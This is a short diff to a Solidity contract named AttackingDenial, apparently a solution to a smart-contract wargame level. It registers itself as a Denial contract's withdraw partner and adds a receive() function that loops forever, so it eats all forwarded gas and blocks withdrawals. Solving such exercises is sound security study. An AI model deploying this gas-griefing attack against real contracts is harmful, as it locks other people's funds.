@@ -10,4 +10,11 @@ contract AttackingDenial {
     }
 
     //Code me!
+    function setWithdrawalPartner() external {
+        Denial(contractAddress).setWithdrawPartner(address(this));
+    }
+
+    receive() external payable {
+        while(true) {}
+    }
 }
